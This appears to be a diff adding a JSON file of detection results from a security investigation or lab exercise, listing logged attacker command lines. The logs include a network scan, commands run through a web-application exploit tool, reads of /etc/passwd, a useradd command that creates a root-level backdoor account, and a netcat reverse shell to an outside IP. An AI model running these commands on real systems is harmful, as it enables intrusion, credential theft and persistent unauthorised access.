@@ -1,0 +1,88 @@
+{
+  "container_id": 48,
+  "detect_initial_compromise": [
+    {
+      "_time": "2018-08-20 12:43:10.000 CEST",
+      "Image": "C:\\Windows\\Temp\\hdoor.exe",
+      "CommandLine": "\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n"
+    },
+    {
+      "_time": "2018-08-20 13:05:40.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami"
+    },
+    {
+      "_time": "2018-08-20 13:05:40.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami"
+    },
+    {
+      "_time": "2018-08-20 13:06:01.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action id"
+    },
+    {
+      "_time": "2018-08-20 13:06:01.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action id"
+    },
+    {
+      "_time": "2018-08-20 13:06:20.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action groups"
+    },
+    {
+      "_time": "2018-08-20 13:06:20.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action groups"
+    },
+    {
+      "_time": "2018-08-20 13:06:38.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"cat /etc/passwd\""
+    },
+    {
+      "_time": "2018-08-20 13:06:38.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"cat /etc/passwd\""
+    },
+    {
+      "_time": "2018-08-20 13:07:03.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com\""
+    }
+  ],
+  "detect_c2_communication": [
+    {
+      "_time": "2018-08-20 13:13:56.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\""
+    },
+    {
+      "_time": "2018-08-20 13:13:57.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\""
+    },
+    {
+      "_time": "2018-08-20 13:34:00.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\""
+    },
+    {
+      "_time": "2018-08-20 13:34:01.000 CEST",
+      "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\""
+    }
+  ],
+  "detect_backdoor_account": [
+    {
+      "_time": "2018-08-20 13:07:03.000 CEST",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com\""
+    },
+    {
+      "_time": "2018-08-20 13:07:03.000 CEST",
+      "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com\""
+    }
+  ],
+  "raw_evidence_summary": "Action: detect_initial_compromise\n  Row 1: _time=2018-08-20 12:43:10.000 CEST, Image=C:\\Windows\\Temp\\hdoor.exe, CommandLine=\"C:\\windows\\temp\\hdoor.exe\" -hbs 192.168.9.1-192.168.9.50 /b /m /n\n  Row 2: _time=2018-08-20 13:05:40.000 CEST, Image=C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\n  Row 3: _time=2018-08-20 13:05:40.000 CEST, Image=C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\nAction: detect_c2_communication\n  Row 1: _time=2018-08-20 13:13:56.000 CEST, Image=C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\n  Row 2: _time=2018-08-20 13:13:57.000 CEST, Image=C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\n  Row 3: _time=2018-08-20 13:34:00.000 CEST, Image=C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\nAction: detect_backdoor_account\n  Row 1: _time=2018-08-20 13:07:03.000 CEST, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr\n  Row 2: _time=2018-08-20 13:07:03.000 CEST, CommandLine=\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/fr"
+}
